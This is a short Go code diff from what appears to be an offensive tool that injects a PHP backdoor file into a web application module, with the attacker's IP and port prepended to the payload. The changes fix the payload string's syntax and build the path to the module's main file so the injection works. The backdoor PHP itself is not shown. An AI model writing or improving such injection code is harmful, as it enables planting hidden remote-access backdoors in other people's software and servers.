@@ -9,7 +9,7 @@ import (
 )
 
 func addAddress(addr data.Address, file *string) {
-	*file = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + *file
+	*file = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *file
 }
 
 func findModuleName(path string) string {
@@ -19,6 +19,7 @@ func findModuleName(path string) string {
 
 func Inject(addr data.Address, path string) error {
 	const backdoorPath string = "../backdoor.php"
+	var mainFilePath string
 	var moduleName string = findModuleName(path)
 
 	mainFile, err := findMainFileDirectory(path, moduleName)
@@ -26,7 +27,8 @@ func Inject(addr data.Address, path string) error {
 		return err
 	}
 
-	return injectBackDoor(addr, mainFile, backdoorPath)
+	mainFilePath = path + "/" + mainFile
+	return injectBackDoor(addr, mainFilePath, backdoorPath)
 }
 
 func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
